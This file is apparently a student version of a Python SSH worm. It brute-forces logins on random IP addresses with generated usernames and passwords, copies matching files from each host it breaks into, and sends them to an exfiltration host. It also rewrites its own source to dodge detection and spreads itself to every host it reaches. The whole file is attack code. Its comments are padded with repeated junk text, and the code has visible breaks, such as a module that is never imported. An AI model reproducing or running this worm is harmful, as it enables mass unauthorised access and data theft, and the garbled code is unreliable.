#!/usr/bin/env python

import sys
import os
import random
import paramiko
import scp
import signal

## Testing file for 'testabraworm.py': anshul baliga anshul baliga

## sys.stdout = open(os.devnull, 'w') anshul baliga anshul baliga

## sys.stderr = open(os.devnull, 'w') anshul baliga anshul baliga

def add_random_strings(line):
    if line.startswith("#"):
        random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        line = line.strip() + f" {random_string}\n"
    return line

def modify_spaces(line):
    parts = line.split()
    if len(parts) > 1:
        for i in range(len(parts) - 1):
            num_spaces = random.randint(0, 3)
            parts[i] += ' ' * num_spaces
        line = ' '.join(parts) + '\n'
    return line

def sig_handler(signum, frame):
    os.kill(os.getpid(), signal.SIGKILL)

signal.signal(signal.SIGINT, sig_handler)

debug = 1 # IMPORTANT: Before changing this setting, read the last
         # paragraph of the main comment block above. As
         # mentioned there, you need to provide two IP
         # addresses in order to run this code in debug
         # mode.

## Breaking bad anshul baliga anshul baliga

## HIMYM Since the anshul baliga anshul baliga

## worm wormy worm worm worm anshul baliga anshul baliga

## fresh batch of hosts, usernames, and passwords. anshul baliga anshul baliga change anshul to baliga comment to anshul

NHOSTS = NUSERNAMES = NPASSWDS = 3

trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum
              bus but buz cam cat ced cel cin cid cip cir con cod cos cop
              cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab
              faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil
              kim kin kip kir kis kit kix laf lad laf lag led leg lem len
              let nab nac nad nag nal nam nan nap nar nas nat oda ode odi
              odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak
              pal pam pap par pas pat pek pem pet qik rab rob rik rom sab
              sad sag sak sam sap sas sat sit sid sic six tab tad tom tod
              wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams = digrams.split()

def get_new_usernames(how_many):
    if debug: return ['seed']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames

def get_new_passwds(how_many):
    if debug: return ['dees']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

def get_fresh_ipaddresses(how_many):
    if debug: return ['192.168.1.11']
    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first, second, third, fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses

# dune part three anshul baliga anshul baliga

# info security anshul baliga anshul baliga

# target got ccyber attacked anshul baliga anshul baliga

# of looping. anshul baliga anshul baliga change anshul to baliga comment to anshul

name = input("\nEnter your name:\n")

print("\nHELLO FROM FooWorm!!\n")
print("\nHELLO ATTACKER:", name)

while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds =   get_new_passwds(NPASSWDS)

    for passwd in passwds:
        for user in usernames:
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                files_of_interest_at_target = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                    print("\n\nconnected\n")

                    cmd = 'grep -ls abracadabra *'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    error = stderr.readlines()

                    if error is not None:
                        print(error)
                        next

                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    for item in received_list:
                        files_of_interest_at_target.append(item.strip())

                    print("\nFiles found by attacker %s: %s" % (name, str(files_of_interest_at_target)))
                    scpcon = scp.SCPClient(ssh.get_transport())
                    if len(files_of_interest_at_target) > 0:
                        for target_file in files_of_interest_at_target:
                            scpcon.get(target_file)
                    content = []
                    with open(__file__, "r") as f:
                        for line in f:
                            line = add_random_strings(line)
                            line = modify_spaces(line)
                            content.append(line)
                            if random.random() < 0.08:
                                new_line = "My name is Anshul Baliga, I live at 308 negra arroyo lane albuquerque new mexico\n"
                                content.append(new_line)

                    with open(__file__, "w") as f:
                        for line in content:
                            f.write(line)

                    scpcon.put(sys.argv[0])
                    scpcon.close()
                except:
                    next
                    print("\nWill now try to exfiltrate the files")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect('192.168.1.11',port=22,username='seed',password='dees',timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\n\nconnected to exhiltration host\n")
                        for filename in files_of_interest_at_target:
                            scpcon.put(filename)
                        scpcon.close()
                    except:
                        print("No uploading of exfiltrated files\n")
                        next
    if debug: break
